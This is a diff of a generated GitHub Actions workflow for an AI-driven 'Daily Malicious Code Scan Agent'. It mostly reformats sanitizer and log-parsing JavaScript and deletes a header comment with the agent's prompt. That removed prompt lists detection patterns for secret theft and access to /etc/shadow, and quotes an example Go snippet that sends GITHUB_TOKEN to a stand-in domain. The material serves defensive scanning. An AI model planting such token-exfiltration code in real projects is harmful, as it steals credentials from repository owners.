@@ -19,356 +19,12 @@
 #   gh aw compile
 # For more information: https://github.com/githubnext/gh-aw/blob/main/.github/aw/github-agentic-workflows.md
 #
-#
 # Daily security scan that reviews code changes from the last 3 days for suspicious patterns indicating malicious agentic threats
-#
-# Original Frontmatter:
-# ```yaml
-# description: Daily security scan that reviews code changes from the last 3 days for suspicious patterns indicating malicious agentic threats
-# on:
-#   schedule: daily
-#   workflow_dispatch:
-# permissions:
-#   contents: read
-#   actions: read
-#   security-events: read
-# tracker-id: malicious-code-scan
-# engine: copilot
-# tools:
-#   github:
-#     toolsets: [repos, code_security]
-#   bash:
-# safe-outputs:
-#   create-code-scanning-alert:
-#     driver: "Malicious Code Scanner"
-#   threat-detection: false
-# timeout-minutes: 15
-# strict: true
-# ```
-#
-# Job Dependency Graph:
-# ```mermaid
-# graph LR
-#   activation["activation"]
-#   agent["agent"]
-#   conclusion["conclusion"]
-#   create_code_scanning_alert["create_code_scanning_alert"]
-#   activation --> agent
-#   activation --> conclusion
-#   agent --> conclusion
-#   agent --> create_code_scanning_alert
-#   create_code_scanning_alert --> conclusion
-# ```
-#
-# Original Prompt:
-# ```markdown
-# {{#runtime-import? .github/shared-instructions.md}}
-#
-# # Daily Malicious Code Scan Agent
-#
-# You are the Daily Malicious Code Scanner - a specialized security agent that analyzes recent code changes for suspicious patterns indicating potential malicious agentic threats.
-#
-# ## Mission
-#
-# Review all code changes made in the last three days and identify suspicious patterns that could indicate:
-# - Attempts to exfiltrate secrets or sensitive data
-# - Code that doesn't fit the project's normal context
-# - Unusual network activity or data transfers
-# - Suspicious system commands or file operations
-# - Hidden backdoors or obfuscated code
-#
-# When suspicious patterns are detected, generate code-scanning alerts (not standard issues) to ensure visibility in the security tools.
-#
-# ## Current Context
-#
-# - **Repository**: ${{ github.repository }}
-# - **Analysis Date**: $(date +%Y-%m-%d)
-# - **Analysis Window**: Last 3 days of commits
-# - **Scanner**: Malicious Code Scanner
-#
-# ## Analysis Framework
-#
-# ### 1. Fetch Git History
-#
-# Since this is a fresh clone, fetch the complete git history:
-#
-# ```bash
-# # Fetch all history for analysis
-# git fetch --unshallow || echo "Repository already has full history"
-#
-# # Get list of files changed in last 3 days
-# git log --since="3 days ago" --name-only --pretty=format: | sort | uniq > /tmp/changed_files.txt
-#
-# # Get commit details for context
-# git log --since="3 days ago" --pretty=format:"%h - %an, %ar : %s" > /tmp/recent_commits.txt
-# ```
-#
-# ### 2. Suspicious Pattern Detection
-#
-# Look for these red flags in the changed code:
-#
-# #### Secret Exfiltration Patterns
-# - Network requests to external domains not in allow-lists
-# - Environment variable access followed by external communication
-# - Base64 encoding of sensitive-looking data
-# - Suspicious use of `curl`, `wget`, or HTTP libraries
-# - Data serialization followed by network calls
-# - Unusual file system writes to temporary or hidden directories
-#
-# **Example patterns to detect:**
-# ```bash
-# # Search for suspicious network patterns
-# grep -E "(curl|wget|fetch|http\.get|requests\.)" /tmp/changed_files.txt | while read -r file; do
-#   if [ -f "$file" ]; then
-#     echo "Checking: $file"
-#     # Check for secrets + network combination
-#     if grep -i "secret\|token\|password\|key" "$file" >/dev/null && \
-#        grep -E "curl|wget|http|fetch" "$file" >/dev/null; then
-#       echo "WARNING: Potential secret exfiltration in $file"
-#     fi
-#   fi
-# done
-# ```
-#
-# #### Out-of-Context Code Patterns
-# - Files with imports or dependencies unusual for their location
-# - Code in unexpected directories (e.g., ML models in a CLI tool)
-# - Sudden introduction of cryptographic operations
-# - Code that accesses unusual system APIs
-# - Files with mismatched naming conventions
-# - Sudden changes in code complexity or style
-#
-# **Example patterns to detect:**
-# ```bash
-# # Check for unusual file additions
-# git log --since="3 days ago" --diff-filter=A --name-only --pretty=format: | \
-#   sort | uniq | while read -r file; do
-#   if [ -f "$file" ]; then
-#     # Check if file is in an unusual location for its type
-#     case "$file" in
-#       *.go)
-#         # Go files outside expected directories
-#         if ! echo "$file" | grep -qE "^(cmd|pkg|internal)/"; then
-#           echo "WARNING: Go file in unusual location: $file"
-#         fi
-#         ;;
-#       *.js|*.cjs)
-#         # JavaScript outside expected directories
-#         if ! echo "$file" | grep -qE "^(pkg/workflow/js|scripts)/"; then
-#           echo "WARNING: JavaScript file in unusual location: $file"
-#         fi
-#         ;;
-#     esac
-#   fi
-# done
-# ```
-#
-# #### Suspicious System Operations
-# - Execution of shell commands with user input
-# - File operations in sensitive directories
-# - Process spawning or system calls
-# - Access to `/etc/passwd`, `/etc/shadow`, or other sensitive files
-# - Privilege escalation attempts
-# - Modification of security-critical files
-#
-# ### 3. Code Review Analysis
-#
-# For each file that changed in the last 3 days:
-#
-# 1. **Get the full diff** to understand what changed:
-#    ```bash
-#    git diff HEAD~$(git rev-list --count --since="3 days ago" HEAD)..HEAD
-#    ```
-#
-# 2. **Analyze new function additions** for suspicious logic:
-#    ```bash
-#    git log --since="3 days ago" --all -p | grep -A 20 "^+func\|^+def\|^+function"
-#    ```
-#
-# 3. **Check for obfuscated code**:
-#    - Long strings of hex or base64
-#    - Unusual character encodings
-#    - Deliberately obscure variable names
-#    - Compression or encryption of code
-#
-# 4. **Look for data exfiltration vectors**:
-#    - Log statements that include secrets
-#    - Debug code that wasn't removed
-#    - Error messages containing sensitive data
-#    - Telemetry or analytics code added
-#
-# ### 4. Contextual Analysis
-#
-# Use the GitHub API tools to gather context:
-#
-# 1. **Review recent PRs and commits** to understand the changes:
-#    ```bash
-#    # Get list of authors from last 3 days
-#    git log --since="3 days ago" --format="%an" | sort | uniq
-#    ```
-#
-# 2. **Check if changes align with repository purpose**:
-#    - Review repository description and README
-#    - Compare against established code patterns
-#    - Verify changes match issue/PR descriptions
-#
-# 3. **Identify anomalies**:
-#    - New contributors with suspicious patterns
-#    - Large code additions without proper review
-#    - Changes to security-sensitive files
-#    - Modifications to CI/CD workflows
-#
-# ### 5. Threat Scoring
-#
-# For each suspicious finding, calculate a threat score (0-10):
-#
-# - **Critical (9-10)**: Active secret exfiltration, backdoors, malicious payloads
-# - **High (7-8)**: Suspicious patterns with high confidence
-# - **Medium (5-6)**: Unusual code that warrants investigation
-# - **Low (3-4)**: Minor anomalies or style inconsistencies
-# - **Info (1-2)**: Informational findings
-#
-# ## Alert Generation Format
-#
-# When suspicious patterns are found, create code-scanning alerts with this structure:
-#
-# ```json
-# {
-#   "create_code_scanning_alert": [
-#     {
-#       "rule_id": "malicious-code-scanner/[CATEGORY]",
-#       "message": "[Brief description of the threat]",
-#       "severity": "[error|warning|note]",
-#       "file_path": "[path/to/file]",
-#       "start_line": [line_number],
-#       "description": "[Detailed explanation of why this is suspicious, including:\n- Pattern detected\n- Context from code review\n- Potential security impact\n- Recommended remediation]"
-#     }
-#   ]
-# }
-# ```
-#
-# **Categories**:
-# - `secret-exfiltration`: Patterns suggesting secret theft
-# - `out-of-context`: Code that doesn't fit the project
-# - `suspicious-network`: Unusual network activity
-# - `system-access`: Suspicious system operations
-# - `obfuscation`: Deliberately obscured code
-# - `privilege-escalation`: Attempts to gain elevated access
-#
-# **Severity Mapping**:
-# - Threat score 9-10: `error`
-# - Threat score 7-8: `error`
-# - Threat score 5-6: `warning`
-# - Threat score 3-4: `warning`
-# - Threat score 1-2: `note`
-#
-# ## Important Guidelines
-#
-# ### Analysis Best Practices
-#
-# - **Be thorough but focused**: Analyze all changed files, but prioritize high-risk areas
-# - **Minimize false positives**: Only alert on genuine suspicious patterns
-# - **Provide actionable details**: Each alert should guide developers on next steps
-# - **Consider context**: Not all unusual code is malicious - look for patterns
-# - **Document reasoning**: Explain why code is flagged as suspicious
-#
-# ### Performance Considerations
-#
-# - **Stay within timeout**: Complete analysis within 15 minutes
-# - **Batch operations**: Group similar git operations
-# - **Focus on changes**: Only analyze files that changed in last 3 days
-# - **Skip generated files**: Ignore lock files, compiled code, dependencies
-#
-# ### Security Considerations
-#
-# - **Treat git history as untrusted**: Code in commits may be malicious
-# - **Never execute suspicious code**: Only analyze, don't run
-# - **Sanitize outputs**: Ensure alert messages don't leak secrets
-# - **Validate file paths**: Prevent path traversal attacks in reporting
-#
-# ## Success Criteria
-#
-# A successful malicious code scan:
-#
-# - ✅ Fetches git history for last 3 days
-# - ✅ Identifies all files changed in the analysis window
-# - ✅ Scans for secret exfiltration patterns
-# - ✅ Detects out-of-context code
-# - ✅ Checks for suspicious system operations
-# - ✅ Generates code-scanning alerts (not issues) for findings
-# - ✅ Provides detailed, actionable alert descriptions
-# - ✅ Completes within 15-minute timeout
-# - ✅ Handles repositories with no changes gracefully
-#
-# ## Output Requirements
-#
-# Your output MUST:
-#
-# 1. **If suspicious patterns are found**:
-#    - Generate code-scanning alerts using the `create_code_scanning_alert` output format
-#    - Each alert must include: rule_id, message, severity, file_path, start_line, description
-#    - Provide detailed descriptions explaining the threat and remediation
-#
-# 2. **If no suspicious patterns are found**:
-#    - Use the `noop` output to log completion:
-#    ```json
-#    {
-#      "noop": {
-#        "message": "✅ Daily malicious code scan completed. Analyzed [N] files changed in the last 3 days. No suspicious patterns detected."
-#      }
-#    }
-#    ```
-#
-# 3. **Analysis summary** (in alert descriptions or noop message):
-#    - Number of files analyzed
-#    - Number of commits reviewed
-#    - Types of patterns searched for
-#    - Confidence level of findings
-#
-# ## Example Alert Output
-#
-# ```json
-# {
-#   "create_code_scanning_alert": [
-#     {
-#       "rule_id": "malicious-code-scanner/secret-exfiltration",
-#       "message": "Potential secret exfiltration: environment variable access followed by external network request",
-#       "severity": "error",
-#       "file_path": "pkg/agent/new_feature.go",
-#       "start_line": 42,
-#       "description": "**Threat Score: 9/10**\n\n**Pattern Detected**: This code reads the GITHUB_TOKEN environment variable and immediately makes an HTTP request to an external domain (example-analytics.com) that is not in the project's approved domains list.\n\n**Code Context**:\n```go\ntoken := os.Getenv(\"GITHUB_TOKEN\")\nhttp.Post(\"https://example-analytics.com/track\", \"application/json\", bytes.NewBuffer([]byte(token)))\n```\n\n**Security Impact**: High - This pattern could be used to exfiltrate GitHub tokens to an attacker-controlled server.\n\n**Recommended Actions**:\n1. Review the commit that introduced this code (commit abc123)\n2. Verify if example-analytics.com is a legitimate service\n3. Check if this domain should be added to allowed network domains\n4. Consider revoking any tokens that may have been exposed\n5. If malicious, remove this code and investigate how it was introduced"
-#     },
-#     {
-#       "rule_id": "malicious-code-scanner/out-of-context",
-#       "message": "Cryptocurrency mining code detected in CLI tool",
-#       "severity": "warning",
-#       "file_path": "cmd/gh-aw/helper.go",
-#       "start_line": 156,
-#       "description": "**Threat Score: 7/10**\n\n**Pattern Detected**: This file imports cryptocurrency mining libraries that are not used anywhere else in the project.\n\n**Code Context**: Recent commit added imports for 'crypto/sha256' and 'math/big' with functions performing repetitive hash calculations typical of proof-of-work mining.\n\n**Security Impact**: Medium - While not directly malicious, resource-intensive mining operations in a CLI tool are highly unusual and suggest supply chain compromise.\n\n**Recommended Actions**:\n1. Review why these mining-related operations were added\n2. Check if the author has legitimate business justification\n3. Consider removing if not essential to core functionality"
-#     }
-#   ]
-# }
-# ```
-#
-# Begin your daily malicious code scan now. Analyze all code changes from the last 3 days, identify suspicious patterns, and generate appropriate code-scanning alerts for any threats detected.
-# ```
-#
-# Pinned GitHub Actions:
-#   - actions/checkout@v5 (93cb6efe18208431cddfb8368fd83d5badbf9bfd)
-#     https://github.com/actions/checkout/commit/93cb6efe18208431cddfb8368fd83d5badbf9bfd
-#   - actions/download-artifact@v6 (018cc2cf5baa6db3ef3c5f8a56943fffe632ef53)
-#     https://github.com/actions/download-artifact/commit/018cc2cf5baa6db3ef3c5f8a56943fffe632ef53
-#   - actions/github-script@v8 (ed597411d8f924073f98dfc5c65a23a2325f34cd)
-#     https://github.com/actions/github-script/commit/ed597411d8f924073f98dfc5c65a23a2325f34cd
-#   - actions/upload-artifact@v5 (330a01c490aca151604b8cf639adc76d48f6c5d4)
-#     https://github.com/actions/upload-artifact/commit/330a01c490aca151604b8cf639adc76d48f6c5d4
-#   - github/codeql-action/upload-sarif@v3 (c37a8b7cd97e31de3fcbd9d84c401870edeb8d34)
-#     https://github.com/github/codeql-action/commit/c37a8b7cd97e31de3fcbd9d84c401870edeb8d34
 
 name: "Daily Malicious Code Scan Agent"
 "on":
   schedule:
-  - cron: "40 23 * * *"
+  - cron: "47 2 * * *"
     # Friendly format: daily (scattered)
   workflow_dispatch: null
 
@@ -458,9 +114,7 @@ jobs:
                   .addRaw("**Files:**\n")
                   .addRaw(`- Source: \`${workflowMdPath}\`\n`)
                   .addRaw(`  - Last commit: ${workflowTimestamp}\n`)
-                  .addRaw(
-                    `  - Commit SHA: [\`${workflowCommit.sha.substring(0, 7)}\`](https://github.com/${owner}/${repo}/commit/${workflowCommit.sha})\n`
-                  )
+                  .addRaw(`  - Commit SHA: [\`${workflowCommit.sha.substring(0, 7)}\`](https://github.com/${owner}/${repo}/commit/${workflowCommit.sha})\n`)
                   .addRaw(`- Lock: \`${lockFilePath}\`\n`)
                   .addRaw(`  - Last commit: ${lockTimestamp}\n`)
                   .addRaw(`  - Commit SHA: [\`${lockCommit.sha.substring(0, 7)}\`](https://github.com/${owner}/${repo}/commit/${lockCommit.sha})\n\n`)
@@ -970,9 +624,7 @@ jobs:
                 server.debug(`  [${toolName}] Python handler args: ${JSON.stringify(args)}`);
                 server.debug(`  [${toolName}] Timeout: ${timeoutSeconds}s`);
                 const inputJson = JSON.stringify(args || {});
-                server.debug(
-                  `  [${toolName}] Input JSON (${inputJson.length} bytes): ${inputJson.substring(0, 200)}${inputJson.length > 200 ? "..." : ""}`
-                );
+                server.debug(`  [${toolName}] Input JSON (${inputJson.length} bytes): ${inputJson.substring(0, 200)}${inputJson.length > 200 ? "..." : ""}`);
                 return new Promise((resolve, reject) => {
                   server.debug(`  [${toolName}] Executing Python script...`);
                   const child = execFile(
@@ -1080,9 +732,7 @@ jobs:
                       try {
                         if (fs.existsSync(outputFile)) {
                           const outputContent = fs.readFileSync(outputFile, "utf-8");
-                          server.debug(
-                            `  [${toolName}] Output file content: ${outputContent.substring(0, 500)}${outputContent.length > 500 ? "..." : ""}`
-                          );
+                          server.debug(`  [${toolName}] Output file content: ${outputContent.substring(0, 500)}${outputContent.length > 500 ? "..." : ""}`);
                           const lines = outputContent.split("\n");
                           for (const line of lines) {
                             const trimmed = line.trim();
@@ -1140,10 +790,7 @@ jobs:
                   fs.mkdirSync(server.logDir, { recursive: true });
                 }
                 const timestamp = new Date().toISOString();
-                fs.writeFileSync(
-                  server.logFilePath,
-                  `# ${server.serverInfo.name} MCP Server Log\n# Started: ${timestamp}\n# Version: ${server.serverInfo.version}\n\n`
-                );
+                fs.writeFileSync(server.logFilePath, `# ${server.serverInfo.name} MCP Server Log\n# Started: ${timestamp}\n# Version: ${server.serverInfo.version}\n\n`);
                 server.logFileInitialized = true;
               } catch {
               }
@@ -1803,10 +1450,7 @@ jobs:
                 const isInWorkspace = absolutePath.startsWith(path.resolve(workspaceDir));
                 const isInTmp = absolutePath.startsWith(tmpDir);
                 if (!isInWorkspace && !isInTmp) {
-                  throw new Error(
-                    `File path must be within workspace directory (${workspaceDir}) or /tmp directory. ` +
-                      `Provided path: ${filePath} (resolved to: ${absolutePath})`
-                  );
+                  throw new Error(`File path must be within workspace directory (${workspaceDir}) or /tmp directory. ` + `Provided path: ${filePath} (resolved to: ${absolutePath})`);
                 }
                 if (!fs.existsSync(filePath)) {
                   throw new Error(`File not found: ${filePath}`);
@@ -2065,10 +1709,7 @@ jobs:
                       };
                       const entryJSON = JSON.stringify(entry);
                       fs.appendFileSync(outputFile, entryJSON + "\n");
-                      const outputText =
-                        jobConfig && jobConfig.output
-                          ? jobConfig.output
-                          : `Safe-job '${configKey}' executed successfully with arguments: ${JSON.stringify(args)}`;
+                      const outputText = jobConfig && jobConfig.output ? jobConfig.output : `Safe-job '${configKey}' executed successfully with arguments: ${JSON.stringify(args)}`;
                       return {
                         content: [
                           {
@@ -2920,16 +2561,13 @@ jobs:
               return result;
             }
             function renderMarkdownTemplate(markdown) {
-              let result = markdown.replace(
-                /(\n?)([ \t]*{{#if\s+([^}]*)}}[ \t]*\n)([\s\S]*?)([ \t]*{{\/if}}[ \t]*)(\n?)/g,
-                (match, leadNL, openLine, cond, body, closeLine, trailNL) => {
-                  if (isTruthy(cond)) {
-                    return leadNL + body;
-                  } else {
-                    return "";
-                  }
+              let result = markdown.replace(/(\n?)([ \t]*{{#if\s+([^}]*)}}[ \t]*\n)([\s\S]*?)([ \t]*{{\/if}}[ \t]*)(\n?)/g, (match, leadNL, openLine, cond, body, closeLine, trailNL) => {
+                if (isTruthy(cond)) {
+                  return leadNL + body;
+                } else {
+                  return "";
                 }
-              );
+              });
               result = result.replace(/{{#if\s+([^}]*)}}([\s\S]*?){{\/if}}/g, (_, cond, body) => (isTruthy(cond) ? body : ""));
               result = result.replace(/\n{3,}/g, "\n\n");
               return result;
@@ -3311,36 +2949,33 @@ jobs:
                 });
               }
               function sanitizeUrlProtocols(s) {
-                return s.replace(
-                  /((?:http|ftp|file|ssh|git):\/\/([\w.-]*)(?:[^\s]*)|(?:data|javascript|vbscript|about|mailto|tel):[^\s]+)/gi,
-                  (match, _fullMatch, domain) => {
-                    if (domain) {
-                      const domainLower = domain.toLowerCase();
-                      const truncated = domainLower.length > 12 ? domainLower.substring(0, 12) + "..." : domainLower;
+                return s.replace(/((?:http|ftp|file|ssh|git):\/\/([\w.-]*)(?:[^\s]*)|(?:data|javascript|vbscript|about|mailto|tel):[^\s]+)/gi, (match, _fullMatch, domain) => {
+                  if (domain) {
+                    const domainLower = domain.toLowerCase();
+                    const truncated = domainLower.length > 12 ? domainLower.substring(0, 12) + "..." : domainLower;
+                    if (typeof core !== "undefined" && core.info) {
+                      core.info(`Redacted URL: ${truncated}`);
+                    }
+                    if (typeof core !== "undefined" && core.debug) {
+                      core.debug(`Redacted URL (full): ${match}`);
+                    }
+                    addRedactedDomain(domainLower);
+                  } else {
+                    const protocolMatch = match.match(/^([^:]+):/);
+                    if (protocolMatch) {
+                      const protocol = protocolMatch[1] + ":";
+                      const truncated = match.length > 12 ? match.substring(0, 12) + "..." : match;
                       if (typeof core !== "undefined" && core.info) {
                         core.info(`Redacted URL: ${truncated}`);
                       }
                       if (typeof core !== "undefined" && core.debug) {
                         core.debug(`Redacted URL (full): ${match}`);
                       }
-                      addRedactedDomain(domainLower);
-                    } else {
-                      const protocolMatch = match.match(/^([^:]+):/);
-                      if (protocolMatch) {
-                        const protocol = protocolMatch[1] + ":";
-                        const truncated = match.length > 12 ? match.substring(0, 12) + "..." : match;
-                        if (typeof core !== "undefined" && core.info) {
-                          core.info(`Redacted URL: ${truncated}`);
-                        }
-                        if (typeof core !== "undefined" && core.debug) {
-                          core.debug(`Redacted URL (full): ${match}`);
-                        }
-                        addRedactedDomain(protocol);
-                      }
+                      addRedactedDomain(protocol);
                     }
-                    return "(redacted)";
                   }
-                );
+                  return "(redacted)";
+                });
               }
               function neutralizeCommands(s) {
                 const commandName = process.env.GH_AW_COMMAND;
@@ -3362,37 +2997,7 @@ jobs:
                 return s.replace(/<!--[\s\S]*?-->/g, "").replace(/<!--[\s\S]*?--!>/g, "");
               }
               function convertXmlTags(s) {
-                const allowedTags = [
-                  "b",
-                  "blockquote",
-                  "br",
-                  "code",
-                  "details",
-                  "em",
-                  "h1",
-                  "h2",
-                  "h3",
-                  "h4",
-                  "h5",
-                  "h6",
-                  "hr",
-                  "i",
-                  "li",
-                  "ol",
-                  "p",
-                  "pre",
-                  "strong",
-                  "sub",
-                  "summary",
-                  "sup",
-                  "table",
-                  "tbody",
-                  "td",
-                  "th",
-                  "thead",
-                  "tr",
-                  "ul",
-                ];
+                const allowedTags = ["b", "blockquote", "br", "code", "details", "em", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i", "li", "ol", "p", "pre", "strong", "sub", "summary", "sup", "table", "tbody", "td", "th", "thead", "tr", "ul"];
                 s = s.replace(/<!\[CDATA\[([\s\S]*?)\]\]>/g, (match, content) => {
                   const convertedContent = content.replace(/<(\/?[A-Za-z][A-Za-z0-9]*(?:[^>]*?))>/g, "($1)");
                   return `(![CDATA[${convertedContent}]])`;
@@ -3504,36 +3109,33 @@ jobs:
                 return result;
               }
               function sanitizeUrlProtocols(s) {
-                return s.replace(
-                  /\b((?:http|ftp|file|ssh|git):\/\/([\w.-]+)(?:[^\s]*)|(?:data|javascript|vbscript|about|mailto|tel):[^\s]+)/gi,
-                  (match, _fullMatch, domain) => {
-                    if (domain) {
-                      const domainLower = domain.toLowerCase();
-                      const truncated = domainLower.length > 12 ? domainLower.substring(0, 12) + "..." : domainLower;
+                return s.replace(/\b((?:http|ftp|file|ssh|git):\/\/([\w.-]+)(?:[^\s]*)|(?:data|javascript|vbscript|about|mailto|tel):[^\s]+)/gi, (match, _fullMatch, domain) => {
+                  if (domain) {
+                    const domainLower = domain.toLowerCase();
+                    const truncated = domainLower.length > 12 ? domainLower.substring(0, 12) + "..." : domainLower;
+                    if (typeof core !== "undefined" && core.info) {
+                      core.info(`Redacted URL: ${truncated}`);
+                    }
+                    if (typeof core !== "undefined" && core.debug) {
+                      core.debug(`Redacted URL (full): ${match}`);
+                    }
+                    addRedactedDomain(domainLower);
+                  } else {
+                    const protocolMatch = match.match(/^([^:]+):/);
+                    if (protocolMatch) {
+                      const protocol = protocolMatch[1] + ":";
+                      const truncated = match.length > 12 ? match.substring(0, 12) + "..." : match;
                       if (typeof core !== "undefined" && core.info) {
                         core.info(`Redacted URL: ${truncated}`);
                       }
                       if (typeof core !== "undefined" && core.debug) {
                         core.debug(`Redacted URL (full): ${match}`);
                       }
-                      addRedactedDomain(domainLower);
-                    } else {
-                      const protocolMatch = match.match(/^([^:]+):/);
-                      if (protocolMatch) {
-                        const protocol = protocolMatch[1] + ":";
-                        const truncated = match.length > 12 ? match.substring(0, 12) + "..." : match;
-                        if (typeof core !== "undefined" && core.info) {
-                          core.info(`Redacted URL: ${truncated}`);
-                        }
-                        if (typeof core !== "undefined" && core.debug) {
-                          core.debug(`Redacted URL (full): ${match}`);
-                        }
-                        addRedactedDomain(protocol);
-                      }
+                      addRedactedDomain(protocol);
                     }
-                    return "(redacted)";
                   }
-                );
+                  return "(redacted)";
+                });
               }
               function neutralizeCommands(s) {
                 const commandName = process.env.GH_AW_COMMAND;
@@ -3559,37 +3161,7 @@ jobs:
                 return s.replace(/<!--[\s\S]*?-->/g, "").replace(/<!--[\s\S]*?--!>/g, "");
               }
               function convertXmlTags(s) {
-                const allowedTags = [
-                  "b",
-                  "blockquote",
-                  "br",
-                  "code",
-                  "details",
-                  "em",
-                  "h1",
-                  "h2",
-                  "h3",
-                  "h4",
-                  "h5",
-                  "h6",
-                  "hr",
-                  "i",
-                  "li",
-                  "ol",
-                  "p",
-                  "pre",
-                  "strong",
-                  "sub",
-                  "summary",
-                  "sup",
-                  "table",
-                  "tbody",
-                  "td",
-                  "th",
-                  "thead",
-                  "tr",
-                  "ul",
-                ];
+                const allowedTags = ["b", "blockquote", "br", "code", "details", "em", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "i", "li", "ol", "p", "pre", "strong", "sub", "summary", "sup", "table", "tbody", "td", "th", "thead", "tr", "ul"];
                 s = s.replace(/<!\[CDATA\[([\s\S]*?)\]\]>/g, (match, content) => {
                   const convertedContent = content.replace(/<(\/?[A-Za-z][A-Za-z0-9]*(?:[^>]*?))>/g, "($1)");
                   return `(![CDATA[${convertedContent}]])`;
@@ -4281,9 +3853,7 @@ jobs:
                   core.info(`Loaded validation config from ${validationConfigPath}`);
                 }
               } catch (error) {
-                core.warning(
-                  `Failed to read validation config from ${validationConfigPath}: ${error instanceof Error ? error.message : String(error)}`
-                );
+                core.warning(`Failed to read validation config from ${validationConfigPath}: ${error instanceof Error ? error.message : String(error)}`);
               }
               const mentionsConfig = validationConfig?.mentions || null;
               const allowedMentions = await resolveAllowedMentionsFromPayload(context, github, core, mentionsConfig);
@@ -4496,9 +4066,7 @@ jobs:
                   core.info(`[INGESTION] Line ${i + 1}: Original type='${originalType}', Normalized type='${itemType}'`);
                   item.type = itemType;
                   if (!expectedOutputTypes[itemType]) {
-                    core.warning(
-                      `[INGESTION] Line ${i + 1}: Type '${itemType}' not found in expected types: ${JSON.stringify(Object.keys(expectedOutputTypes))}`
-                    );
+                    core.warning(`[INGESTION] Line ${i + 1}: Type '${itemType}' not found in expected types: ${JSON.stringify(Object.keys(expectedOutputTypes))}`);
                     errors.push(`Line ${i + 1}: Unexpected output type '${itemType}'. Expected one of: ${Object.keys(expectedOutputTypes).join(", ")}`);
                     continue;
                   }
@@ -4580,10 +4148,7 @@ jobs:
               core.info(`Patch file ${hasPatch ? "exists" : "does not exist"} at: ${patchPath}`);
               let allowEmptyPR = false;
               if (safeOutputsConfig) {
-                if (
-                  safeOutputsConfig["create-pull-request"]?.["allow-empty"] === true ||
-                  safeOutputsConfig["create_pull_request"]?.["allow_empty"] === true
-                ) {
+                if (safeOutputsConfig["create-pull-request"]?.["allow-empty"] === true || safeOutputsConfig["create_pull_request"]?.["allow_empty"] === true) {
                   allowEmptyPR = true;
                   core.info(`allow-empty is enabled for create-pull-request`);
                 }
@@ -4954,24 +4519,7 @@ jobs:
                   "Custom Agents": [],
                   Other: [],
                 };
-                const builtinTools = [
-                  "bash",
-                  "write_bash",
-                  "read_bash",
-                  "stop_bash",
-                  "list_bash",
-                  "grep",
-                  "glob",
-                  "view",
-                  "create",
-                  "edit",
-                  "store_memory",
-                  "code_review",
-                  "codeql_checker",
-                  "report_progress",
-                  "report_intent",
-                  "gh-advisory-database",
-                ];
+                const builtinTools = ["bash", "write_bash", "read_bash", "stop_bash", "list_bash", "grep", "glob", "view", "create", "edit", "store_memory", "code_review", "codeql_checker", "report_progress", "report_intent", "gh-advisory-database"];
                 const internalTools = ["fetch_copilot_cli_documentation"];
                 for (const tool of initEntry.tools) {
                   const toolLower = tool.toLowerCase();
@@ -5367,9 +4915,7 @@ jobs:
                   const cacheCreationTokens = usage.cache_creation_input_tokens || 0;
                   const cacheReadTokens = usage.cache_read_input_tokens || 0;
                   const totalTokens = inputTokens + outputTokens + cacheCreationTokens + cacheReadTokens;
-                  lines.push(
-                    `  Tokens: ${totalTokens.toLocaleString()} total (${usage.input_tokens.toLocaleString()} in / ${usage.output_tokens.toLocaleString()} out)`
-                  );
+                  lines.push(`  Tokens: ${totalTokens.toLocaleString()} total (${usage.input_tokens.toLocaleString()} in / ${usage.output_tokens.toLocaleString()} out)`);
                 }
               }
               if (lastEntry?.total_cost_usd) {
@@ -5528,9 +5074,7 @@ jobs:
                   const cacheCreationTokens = usage.cache_creation_input_tokens || 0;
                   const cacheReadTokens = usage.cache_read_input_tokens || 0;
                   const totalTokens = inputTokens + outputTokens + cacheCreationTokens + cacheReadTokens;
-                  lines.push(
-                    `  Tokens: ${totalTokens.toLocaleString()} total (${usage.input_tokens.toLocaleString()} in / ${usage.output_tokens.toLocaleString()} out)`
-                  );
+                  lines.push(`  Tokens: ${totalTokens.toLocaleString()} total (${usage.input_tokens.toLocaleString()} in / ${usage.output_tokens.toLocaleString()} out)`);
                 }
               }
               if (lastEntry?.total_cost_usd) {
@@ -5631,11 +5175,7 @@ jobs:
               });
             }
             function extractPremiumRequestCount(logContent) {
-              const patterns = [
-                /premium\s+requests?\s+consumed:?\s*(\d+)/i,
-                /(\d+)\s+premium\s+requests?\s+consumed/i,
-                /consumed\s+(\d+)\s+premium\s+requests?/i,
-              ];
+              const patterns = [/premium\s+requests?\s+consumed:?\s*(\d+)/i, /(\d+)\s+premium\s+requests?\s+consumed/i, /consumed\s+(\d+)\s+premium\s+requests?/i];
               for (const pattern of patterns) {
                 const match = logContent.match(pattern);
                 if (match && match[1]) {
@@ -5707,8 +5247,7 @@ jobs:
                 const initEntry = logEntries.find(entry => entry.type === "system" && entry.subtype === "init");
                 markdown += generateInformationSection(lastEntry, {
                   additionalInfoCallback: entry => {
-                    const isPremiumModel =
-                      initEntry && initEntry.model_info && initEntry.model_info.billing && initEntry.model_info.billing.is_premium === true;
+                    const isPremiumModel = initEntry && initEntry.model_info && initEntry.model_info.billing && initEntry.model_info.billing.is_premium === true;
                     if (isPremiumModel) {
                       const premiumRequestCount = extractPremiumRequestCount(logContent);
                       return `**Premium Requests Consumed:** ${premiumRequestCount}\n\n`;
@@ -6135,299 +5674,151 @@ jobs:
         with:
           script: |
             function sanitizeWorkflowName(name) {
-
               return name
-
                 .toLowerCase()
-
                 .replace(/[:\\/\s]/g, "-")
-
                 .replace(/[^a-z0-9._-]/g, "-");
-
             }
-
             function main() {
-
               const fs = require("fs");
-
               const path = require("path");
-
               try {
-
                 const squidLogsDir = `/tmp/gh-aw/sandbox/firewall/logs/`;
-
                 if (!fs.existsSync(squidLogsDir)) {
-
                   core.info(`No firewall logs directory found at: ${squidLogsDir}`);
-
                   return;
-
                 }
-
                 const files = fs.readdirSync(squidLogsDir).filter(file => file.endsWith(".log"));
-
                 if (files.length === 0) {
-
                   core.info(`No firewall log files found in: ${squidLogsDir}`);
-
                   return;
-
                 }
-
                 core.info(`Found ${files.length} firewall log file(s)`);
-
                 let totalRequests = 0;
-
                 let allowedRequests = 0;
-
                 let deniedRequests = 0;
-
                 const allowedDomains = new Set();
-
                 const deniedDomains = new Set();
-
                 const requestsByDomain = new Map();
-
                 for (const file of files) {
-
                   const filePath = path.join(squidLogsDir, file);
-
                   core.info(`Parsing firewall log: ${file}`);
-
                   const content = fs.readFileSync(filePath, "utf8");
-
                   const lines = content.split("\n").filter(line => line.trim());
-
                   for (const line of lines) {
-
                     const entry = parseFirewallLogLine(line);
-
                     if (!entry) {
-
                       continue;
-
                     }
-
                     totalRequests++;
-
                     const isAllowed = isRequestAllowed(entry.decision, entry.status);
-
                     if (isAllowed) {
-
                       allowedRequests++;
-
